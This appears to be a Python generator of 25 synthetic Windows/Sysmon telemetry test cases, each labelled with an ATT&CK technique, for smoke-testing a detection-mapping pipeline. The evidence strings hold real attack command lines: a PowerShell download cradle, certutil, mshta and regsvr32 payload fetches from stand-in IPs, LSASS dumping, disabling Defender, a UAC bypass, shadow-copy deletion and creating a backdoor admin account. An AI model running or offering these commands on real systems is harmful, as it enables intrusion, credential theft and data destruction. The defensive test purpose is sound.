"""
RAG2ATTCK - Synthetic Smoke Test Cases Generator (Milestone M3, Task T14)
Generates 25 realistic, sanitized Sysmon / Windows endpoint telemetry cases
saved to data/synthetic/smoke_cases.jsonl.

RESEARCH INTEGRITY NOTICE:
This data is strictly for engineering smoke testing and pipeline verification.
It must NEVER be used in RQ1/RQ2/RQ3 evaluation or contribute to paper results.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any, Dict, List

NON_RESEARCH_NOTICE = (
    "ENGINEERING-ONLY DATA: Created strictly for engineering smoke testing and "
    "pipeline verification. Must never contribute to research results or papers."
)

RAW_SPECS = [
    (
        "synthetic_001",
        "T1059.001",
        "Command and Scripting Interpreter: PowerShell",
        "Execution",
        "In-memory download cradle execution via PowerShell IEX WebClient",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 14:22:01.124\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000001}\n"
            "ProcessId: 4820\n"
            "Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
            'CommandLine: powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://198.51.100.42/payload.ps1\')"\n'
            "CurrentDirectory: C:\\Users\\jdoe\\\n"
            "User: CORP\\jdoe\n"
            "ParentImage: C:\\Windows\\explorer.exe\n"
            "ParentCommandLine: C:\\Windows\\Explorer.EXE\n"
            "Hashes: SHA256=8C32B9481DF9548E596B21B273A3C9EBEF7540D36B4EB26E23199B9A608F6B7E\n"
            "---\n"
            "EventID: 3 (Network Connection)\n"
            "UtcTime: 2026-09-15 14:22:03.450\n"
            "ProcessId: 4820\n"
            "Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
            "Protocol: tcp\n"
            "Initiated: true\n"
            "SourceIp: 192.168.1.105\n"
            "SourcePort: 49821\n"
            "DestinationIp: 198.51.100.42\n"
            "DestinationPort: 80\n"
            "DestinationHostname: c2.internal-update.com\n"
            "---\n"
            "EventID: 4104 (Script Block Logging)\n"
            "ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.42/payload.ps1')"
        ),
    ),
    (
        "synthetic_002",
        "T1059.003",
        "Command and Scripting Interpreter: Windows Command Shell",
        "Execution",
        "Command shell batch reconnaissance script spawning discovery subcommands",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 14:25:10.018\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000002}\n"
            "ProcessId: 5124\n"
            "Image: C:\\Windows\\System32\\cmd.exe\n"
            'CommandLine: cmd.exe /c "whoami /all & net user /domain"\n'
            "CurrentDirectory: C:\\Windows\\Temp\\\n"
            "User: CORP\\jdoe\n"
            "ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
            "---\n"
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 14:25:10.340\n"
            "ProcessId: 5192\n"
            "Image: C:\\Windows\\System32\\whoami.exe\n"
            "CommandLine: whoami /all\n"
            "User: CORP\\jdoe\n"
            "ParentProcessId: 5124\n"
            "ParentImage: C:\\Windows\\System32\\cmd.exe"
        ),
    ),
    (
        "synthetic_003",
        "T1053.005",
        "Scheduled Task/Job: Scheduled Task",
        "Persistence",
        "Persistence via scheduled task creation running on logon under SYSTEM context",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 14:30:15.540\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000003}\n"
            "ProcessId: 6204\n"
            "Image: C:\\Windows\\System32\\schtasks.exe\n"
            'CommandLine: schtasks.exe /create /tn "Microsoft\\Windows\\AppHealthCheck" /tr "C:\\ProgramData\\health.bat" /sc onlogon /ru "SYSTEM"\n'
            "CurrentDirectory: C:\\Windows\\system32\\\n"
            "User: NT AUTHORITY\\SYSTEM\n"
            "ParentImage: C:\\Windows\\System32\\cmd.exe\n"
            "---\n"
            "EventID: 11 (File Create)\n"
            "UtcTime: 2026-09-15 14:30:12.110\n"
            "ProcessId: 6180\n"
            "Image: C:\\Windows\\System32\\cmd.exe\n"
            "TargetFilename: C:\\ProgramData\\health.bat\n"
            "CreationUtcTime: 2026-09-15 14:30:12.110"
        ),
    ),
    (
        "synthetic_004",
        "T1105",
        "Ingress Tool Transfer",
        "Command and Control",
        "Staging secondary executable payload via certutil urlcache download",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 14:34:02.890\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000004}\n"
            "ProcessId: 7112\n"
            "Image: C:\\Windows\\System32\\certutil.exe\n"
            "CommandLine: certutil.exe -urlcache -split -f http://203.0.113.88/stage2.exe C:\\Users\\Public\\stage2.exe\n"
            "CurrentDirectory: C:\\Users\\Public\\\n"
            "User: CORP\\jdoe\n"
            "---\n"
            "EventID: 3 (Network Connection)\n"
            "UtcTime: 2026-09-15 14:34:03.420\n"
            "ProcessId: 7112\n"
            "Image: C:\\Windows\\System32\\certutil.exe\n"
            "Protocol: tcp\n"
            "Initiated: true\n"
            "SourceIp: 192.168.1.105\n"
            "SourcePort: 50114\n"
            "DestinationIp: 203.0.113.88\n"
            "DestinationPort: 80\n"
            "---\n"
            "EventID: 11 (File Create)\n"
            "UtcTime: 2026-09-15 14:34:04.102\n"
            "ProcessId: 7112\n"
            "Image: C:\\Windows\\System32\\certutil.exe\n"
            "TargetFilename: C:\\Users\\Public\\stage2.exe"
        ),
    ),
    (
        "synthetic_005",
        "T1003.001",
        "OS Credential Dumping: LSASS Memory",
        "Credential Access",
        "Memory dump of LSASS process using comsvcs.dll export MiniDump",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 14:38:22.441\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000005}\n"
            "ProcessId: 8104\n"
            "Image: C:\\Windows\\System32\\rundll32.exe\n"
            "CommandLine: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 648 C:\\Windows\\Temp\\debug.dmp full\n"
            "User: NT AUTHORITY\\SYSTEM\n"
            "---\n"
            "EventID: 10 (Process Access)\n"
            "UtcTime: 2026-09-15 14:38:22.610\n"
            "SourceProcessId: 8104\n"
            "SourceImage: C:\\Windows\\System32\\rundll32.exe\n"
            "TargetProcessId: 648\n"
            "TargetImage: C:\\Windows\\System32\\lsass.exe\n"
            "GrantedAccess: 0x1FFFFF\n"
            "CallTrace: C:\\Windows\\System32\\comsvcs.dll+0x21a4\n"
            "---\n"
            "EventID: 11 (File Create)\n"
            "UtcTime: 2026-09-15 14:38:23.015\n"
            "ProcessId: 8104\n"
            "Image: C:\\Windows\\System32\\rundll32.exe\n"
            "TargetFilename: C:\\Windows\\Temp\\debug.dmp"
        ),
    ),
    (
        "synthetic_006",
        "T1547.001",
        "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "Persistence",
        "Writing persistence binary path to HKLM Run registry key",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 14:41:05.105\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000006}\n"
            "ProcessId: 8440\n"
            "Image: C:\\Windows\\System32\\reg.exe\n"
            'CommandLine: reg.exe add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityHealthSystray" /t REG_SZ /d "C:\\ProgramData\\svc.exe" /f\n'
            "User: CORP\\Administrator\n"
            "---\n"
            "EventID: 13 (Registry Value Set)\n"
            "UtcTime: 2026-09-15 14:41:05.210\n"
            "ProcessId: 8440\n"
            "Image: C:\\Windows\\System32\\reg.exe\n"
            "TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealthSystray\n"
            "Details: C:\\ProgramData\\svc.exe"
        ),
    ),
    (
        "synthetic_007",
        "T1087.001",
        "Account Discovery: Local Account",
        "Discovery",
        "Enumeration of local administrators group membership",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 14:45:11.782\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000007}\n"
            "ProcessId: 8904\n"
            "Image: C:\\Windows\\System32\\net.exe\n"
            'CommandLine: net.exe localgroup "Administrators"\n'
            "CurrentDirectory: C:\\Users\\jdoe\\\n"
            "User: CORP\\jdoe\n"
            "ParentImage: C:\\Windows\\System32\\cmd.exe\n"
            "---\n"
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 14:45:12.012\n"
            "ProcessId: 8960\n"
            "Image: C:\\Windows\\System32\\net1.exe\n"
            'CommandLine: C:\\Windows\\system32\\net1.exe localgroup "Administrators"\n'
            "User: CORP\\jdoe\n"
            "ParentProcessId: 8904"
        ),
    ),
    (
        "synthetic_008",
        "T1562.001",
        "Impair Defenses: Disable or Modify Tools",
        "Defense Evasion",
        "Disabling Windows Defender security protection via policy registry modification",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 14:48:30.290\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000008}\n"
            "ProcessId: 9244\n"
            "Image: C:\\Windows\\System32\\reg.exe\n"
            'CommandLine: reg.exe add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f\n'
            "User: NT AUTHORITY\\SYSTEM\n"
            "---\n"
            "EventID: 13 (Registry Value Set)\n"
            "UtcTime: 2026-09-15 14:48:30.410\n"
            "ProcessId: 9244\n"
            "Image: C:\\Windows\\System32\\reg.exe\n"
            "TargetObject: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware\n"
            "Details: 0x00000001"
        ),
    ),
    (
        "synthetic_009",
        "T1112",
        "Modify Registry",
        "Defense Evasion",
        "Altering terminal server settings in registry to enable remote desktop access",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 14:52:00.601\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000009}\n"
            "ProcessId: 9608\n"
            "Image: C:\\Windows\\System32\\reg.exe\n"
            'CommandLine: reg.exe add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n'
            "User: CORP\\Administrator\n"
            "---\n"
            "EventID: 13 (Registry Value Set)\n"
            "UtcTime: 2026-09-15 14:52:00.730\n"
            "ProcessId: 9608\n"
            "Image: C:\\Windows\\System32\\reg.exe\n"
            "TargetObject: HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections\n"
            "Details: 0x00000000"
        ),
    ),
    (
        "synthetic_010",
        "T1055.001",
        "Process Injection: Dynamic-link Library Injection",
        "Defense Evasion",
        "Injecting unsigned malicious dynamic-link library into svchost via CreateRemoteThread",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 14:56:40.115\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000010}\n"
            "ProcessId: 10120\n"
            "Image: C:\\Windows\\Temp\\loader.exe\n"
            "CommandLine: C:\\Windows\\Temp\\loader.exe --inject 1248 C:\\Windows\\Temp\\injected.dll\n"
            "User: CORP\\jdoe\n"
            "---\n"
            "EventID: 10 (Process Access)\n"
            "UtcTime: 2026-09-15 14:56:40.240\n"
            "SourceProcessId: 10120\n"
            "SourceImage: C:\\Windows\\Temp\\loader.exe\n"
            "TargetProcessId: 1248\n"
            "TargetImage: C:\\Windows\\System32\\svchost.exe\n"
            "GrantedAccess: 0x1F0FFF\n"
            "---\n"
            "EventID: 8 (CreateRemoteThread)\n"
            "UtcTime: 2026-09-15 14:56:40.350\n"
            "SourceProcessId: 10120\n"
            "TargetProcessId: 1248\n"
            "StartAddress: 0x00007FF61A2B0000\n"
            "---\n"
            "EventID: 7 (Image Loaded)\n"
            "UtcTime: 2026-09-15 14:56:40.410\n"
            "ProcessId: 1248\n"
            "Image: C:\\Windows\\System32\\svchost.exe\n"
            "ImageLoaded: C:\\Windows\\Temp\\injected.dll\n"
            "Signed: false"
        ),
    ),
    (
        "synthetic_011",
        "T1070.004",
        "Indicator Removal: File Deletion",
        "Defense Evasion",
        "Cleaning up staged binaries and temporary artifacts from disk",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:01:12.809\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000011}\n"
            "ProcessId: 10580\n"
            "Image: C:\\Windows\\System32\\cmd.exe\n"
            'CommandLine: cmd.exe /c "del /f /q C:\\Windows\\Temp\\*.tmp & del /f /q C:\\Users\\Public\\stage2.exe"\n'
            "User: CORP\\jdoe\n"
            "---\n"
            "EventID: 11 (File Delete)\n"
            "UtcTime: 2026-09-15 15:01:13.014\n"
            "ProcessId: 10580\n"
            "Image: C:\\Windows\\System32\\cmd.exe\n"
            "TargetFilename: C:\\Users\\Public\\stage2.exe"
        ),
    ),
    (
        "synthetic_012",
        "T1218.005",
        "System Binary Proxy Execution: Mshta",
        "Defense Evasion",
        "Executing remote malicious HTML Application via trusted mshta proxy binary",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:05:22.312\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000012}\n"
            "ProcessId: 11044\n"
            "Image: C:\\Windows\\System32\\mshta.exe\n"
            "CommandLine: mshta.exe http://192.0.2.77/analytics.hta\n"
            "CurrentDirectory: C:\\Users\\jdoe\\\n"
            "User: CORP\\jdoe\n"
            "---\n"
            "EventID: 3 (Network Connection)\n"
            "UtcTime: 2026-09-15 15:05:23.010\n"
            "ProcessId: 11044\n"
            "Image: C:\\Windows\\System32\\mshta.exe\n"
            "Protocol: tcp\n"
            "Initiated: true\n"
            "SourceIp: 192.168.1.105\n"
            "DestinationIp: 192.0.2.77\n"
            "DestinationPort: 80"
        ),
    ),
    (
        "synthetic_013",
        "T1218.010",
        "System Binary Proxy Execution: Regsvr32",
        "Defense Evasion",
        "Squiblydoo execution of COM scriptlet via signed regsvr32 binary",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:09:44.200\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000013}\n"
            "ProcessId: 11520\n"
            "Image: C:\\Windows\\System32\\regsvr32.exe\n"
            "CommandLine: regsvr32.exe /s /n /u /i:http://198.51.100.55/app.sct scrobj.dll\n"
            "User: CORP\\jdoe\n"
            "---\n"
            "EventID: 3 (Network Connection)\n"
            "UtcTime: 2026-09-15 15:09:44.890\n"
            "ProcessId: 11520\n"
            "Image: C:\\Windows\\System32\\regsvr32.exe\n"
            "Protocol: tcp\n"
            "Initiated: true\n"
            "SourceIp: 192.168.1.105\n"
            "DestinationIp: 198.51.100.55\n"
            "DestinationPort: 80\n"
            "---\n"
            "EventID: 7 (Image Loaded)\n"
            "UtcTime: 2026-09-15 15:09:45.105\n"
            "ProcessId: 11520\n"
            "Image: C:\\Windows\\System32\\regsvr32.exe\n"
            "ImageLoaded: C:\\Windows\\System32\\scrobj.dll"
        ),
    ),
    (
        "synthetic_014",
        "T1218.011",
        "System Binary Proxy Execution: Rundll32",
        "Defense Evasion",
        "Proxy execution of unverified DLL export entry point using rundll32",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:13:30.650\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000014}\n"
            "ProcessId: 12010\n"
            "Image: C:\\Windows\\System32\\rundll32.exe\n"
            "CommandLine: rundll32.exe C:\\ProgramData\\client.dll,DllRegisterServer\n"
            "User: CORP\\jdoe\n"
            "---\n"
            "EventID: 7 (Image Loaded)\n"
            "UtcTime: 2026-09-15 15:13:30.790\n"
            "ProcessId: 12010\n"
            "Image: C:\\Windows\\System32\\rundll32.exe\n"
            "ImageLoaded: C:\\ProgramData\\client.dll\n"
            "Signed: false"
        ),
    ),
    (
        "synthetic_015",
        "T1047",
        "Windows Management Instrumentation",
        "Execution",
        "Spawning process via WMI process call create invoked through WMIC",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:17:05.120\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000015}\n"
            "ProcessId: 12530\n"
            "Image: C:\\Windows\\System32\\wbem\\WMIC.exe\n"
            'CommandLine: wmic.exe /node:127.0.0.1 process call create "cmd.exe /c start calc.exe"\n'
            "User: CORP\\Administrator\n"
            "---\n"
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:17:05.610\n"
            "ProcessId: 12612\n"
            "Image: C:\\Windows\\System32\\cmd.exe\n"
            "CommandLine: cmd.exe /c start calc.exe\n"
            "ParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\n"
            "ParentCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"
        ),
    ),
    (
        "synthetic_016",
        "T1548.002",
        "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "Privilege Escalation",
        "Auto-elevating binary hijack via ms-settings registry command override in fodhelper",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:21:40.090\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000016}\n"
            "ProcessId: 13100\n"
            "Image: C:\\Windows\\System32\\fodhelper.exe\n"
            "CommandLine: C:\\Windows\\System32\\fodhelper.exe\n"
            "User: CORP\\jdoe\n"
            "---\n"
            "EventID: 13 (Registry Value Set)\n"
            "UtcTime: 2026-09-15 15:21:39.810\n"
            "TargetObject: HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\(Default)\n"
            "Details: C:\\Windows\\Temp\\agent.exe\n"
            "---\n"
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:21:40.350\n"
            "ProcessId: 13180\n"
            "Image: C:\\Windows\\Temp\\agent.exe\n"
            "CommandLine: C:\\Windows\\Temp\\agent.exe\n"
            "IntegrityLevel: High\n"
            "ParentImage: C:\\Windows\\System32\\fodhelper.exe"
        ),
    ),
    (
        "synthetic_017",
        "T1566.001",
        "Phishing: Spearphishing Attachment",
        "Initial Access",
        "Malicious macro document delivered via email attachment spawning hidden PowerShell",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:25:55.300\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000017}\n"
            "ProcessId: 13620\n"
            "Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
            "CommandLine: powershell.exe -nop -w hidden -enc JABjAGwAaQ...\n"
            "User: CORP\\jdoe\n"
            "ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\n"
            'ParentCommandLine: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\jdoe\\Downloads\\invoice_sep2026.docm"\n'
            "---\n"
            "EventID: 11 (File Create)\n"
            "UtcTime: 2026-09-15 15:25:30.120\n"
            "ProcessId: 4120\n"
            "Image: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n"
            "TargetFilename: C:\\Users\\jdoe\\Downloads\\invoice_sep2026.docm"
        ),
    ),
    (
        "synthetic_018",
        "T1486",
        "Data Encrypted for Impact",
        "Impact",
        "Bulk encryption of user documents appending .locked and creating ransom notice",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:30:10.740\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000018}\n"
            "ProcessId: 14100\n"
            "Image: C:\\Users\\Public\\cryptolock.exe\n"
            'CommandLine: C:\\Users\\Public\\cryptolock.exe --encrypt "C:\\Users\\jdoe\\Documents"\n'
            "User: CORP\\jdoe\n"
            "---\n"
            "EventID: 11 (File Create)\n"
            "UtcTime: 2026-09-15 15:30:12.890\n"
            "ProcessId: 14100\n"
            "Image: C:\\Users\\Public\\cryptolock.exe\n"
            "TargetFilename: C:\\Users\\jdoe\\Documents\\FINANCIAL_REPORT.xlsx.locked\n"
            "---\n"
            "EventID: 11 (File Create)\n"
            "UtcTime: 2026-09-15 15:30:13.120\n"
            "ProcessId: 14100\n"
            "Image: C:\\Users\\Public\\cryptolock.exe\n"
            "TargetFilename: C:\\Users\\jdoe\\Documents\\HOW_TO_DECRYPT.txt"
        ),
    ),
    (
        "synthetic_019",
        "T1490",
        "Inhibit System Recovery",
        "Impact",
        "Silent deletion of volume shadow copies and system backup catalog",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:34:25.405\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000019}\n"
            "ProcessId: 14580\n"
            "Image: C:\\Windows\\System32\\vssadmin.exe\n"
            "CommandLine: vssadmin.exe delete shadows /all /quiet\n"
            "User: NT AUTHORITY\\SYSTEM\n"
            "ParentImage: C:\\Windows\\System32\\cmd.exe\n"
            "---\n"
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:34:26.110\n"
            "ProcessId: 14620\n"
            "Image: C:\\Windows\\System32\\wbadmin.exe\n"
            "CommandLine: wbadmin.exe delete catalog -quiet\n"
            "User: NT AUTHORITY\\SYSTEM"
        ),
    ),
    (
        "synthetic_020",
        "T1082",
        "System Information Discovery",
        "Discovery",
        "Host OS version, patch level, and architecture enumeration via systeminfo",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:38:00.180\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000020}\n"
            "ProcessId: 15120\n"
            "Image: C:\\Windows\\System32\\cmd.exe\n"
            'CommandLine: cmd.exe /c "systeminfo & hostname & ver"\n'
            "User: CORP\\jdoe\n"
            "---\n"
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:38:00.410\n"
            "ProcessId: 15190\n"
            "Image: C:\\Windows\\System32\\systeminfo.exe\n"
            "CommandLine: systeminfo\n"
            "User: CORP\\jdoe\n"
            "ParentProcessId: 15120"
        ),
    ),
    (
        "synthetic_021",
        "T1083",
        "File and Directory Discovery",
        "Discovery",
        "Recursive directory listing to locate KeePass databases and configuration files",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:42:15.890\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000021}\n"
            "ProcessId: 15640\n"
            "Image: C:\\Windows\\System32\\cmd.exe\n"
            'CommandLine: cmd.exe /c dir /s /b C:\\Users\\*.kdbx C:\\Users\\*.conf\n'
            "User: CORP\\jdoe\n"
            "ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        ),
    ),
    (
        "synthetic_022",
        "T1016",
        "System Network Configuration Discovery",
        "Discovery",
        "Discovery of network interfaces, IP addresses, gateways, and routing tables",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:46:50.310\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000022}\n"
            "ProcessId: 16100\n"
            "Image: C:\\Windows\\System32\\ipconfig.exe\n"
            "CommandLine: ipconfig.exe /all\n"
            "User: CORP\\jdoe\n"
            "---\n"
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:46:51.050\n"
            "ProcessId: 16140\n"
            "Image: C:\\Windows\\System32\\route.exe\n"
            "CommandLine: route.exe print\n"
            "User: CORP\\jdoe"
        ),
    ),
    (
        "synthetic_023",
        "T1078.003",
        "Valid Accounts: Local Accounts",
        "Defense Evasion",
        "Creation of rogue local administrator account for backdoor access",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:50:35.660\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000023}\n"
            "ProcessId: 16620\n"
            "Image: C:\\Windows\\System32\\net.exe\n"
            "CommandLine: net.exe user backup_adm Passw0rd2026! /add\n"
            "User: CORP\\Administrator\n"
            "---\n"
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:50:37.210\n"
            "ProcessId: 16680\n"
            "Image: C:\\Windows\\System32\\net.exe\n"
            "CommandLine: net.exe localgroup administrators backup_adm /add\n"
            "User: CORP\\Administrator"
        ),
    ),
    (
        "synthetic_024",
        "T1027.002",
        "Obfuscated Files or Information: Software Packing",
        "Defense Evasion",
        "Execution of binary packed with UPX compressor to evade signature detection",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:54:12.440\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000024}\n"
            "ProcessId: 17140\n"
            "Image: C:\\Users\\Public\\packed_dropper.exe\n"
            "CommandLine: C:\\Users\\Public\\packed_dropper.exe -silent\n"
            "User: CORP\\jdoe\n"
            "---\n"
            "EventID: 7 (Image Loaded)\n"
            "UtcTime: 2026-09-15 15:54:12.590\n"
            "ProcessId: 17140\n"
            "Image: C:\\Users\\Public\\packed_dropper.exe\n"
            "ImageLoaded: C:\\Users\\Public\\packed_dropper.exe\n"
            "Description: SectionHeaders contain UPX0, UPX1 packer signatures"
        ),
    ),
    (
        "synthetic_025",
        "T1570",
        "Lateral Tool Transfer",
        "Lateral Movement",
        "Transferring remote administration utility across admin share using SMB port 445",
        (
            "EventID: 1 (Process Creation)\n"
            "UtcTime: 2026-09-15 15:58:05.105\n"
            "ProcessGuid: {A1010101-1111-2222-3333-000000000025}\n"
            "ProcessId: 17610\n"
            "Image: C:\\Windows\\System32\\cmd.exe\n"
            "CommandLine: cmd.exe /c copy /y C:\\Tools\\psexec.exe \\\\192.168.1.50\\C$\\Windows\\Temp\\psexec.exe\n"
            "User: CORP\\Administrator\n"
            "---\n"
            "EventID: 3 (Network Connection)\n"
            "UtcTime: 2026-09-15 15:58:05.890\n"
            "ProcessId: 17610\n"
            "Image: C:\\Windows\\System32\\cmd.exe\n"
            "Protocol: tcp\n"
            "Initiated: true\n"
            "SourceIp: 192.168.1.105\n"
            "DestinationIp: 192.168.1.50\n"
            "DestinationPort: 445"
        ),
    ),
]


def build_cases() -> List[Dict[str, Any]]:
    cases = []
    for sample_id, tech_id, name, tactic, behavior, evidence in RAW_SPECS:
        cases.append(
            {
                "sample_id": sample_id,
                "dataset_purpose": "ENGINEERING_ONLY_SMOKE_TEST",
                "endpoint_evidence": evidence,
                "synthetic_debug_ground_truth": {
                    "technique_id": tech_id,
                    "technique_name": name,
                    "tactic": tactic,
                    "simulated_behavior": behavior,
                    "non_research_notice": NON_RESEARCH_NOTICE,
                },
            }
        )
    return cases


def generate_cases_file(
    output_path: Path | str = "data/synthetic/smoke_cases.jsonl",
) -> Path:
    target = Path(output_path)
    target.parent.mkdir(parents=True, exist_ok=True)
    cases = build_cases()
    with open(target, "w", encoding="utf-8") as f:
        for c in cases:
            f.write(json.dumps(c) + "\n")
    return target


if __name__ == "__main__":
    p = generate_cases_file()
    print(f"Successfully generated 25 synthetic cases at {p}")

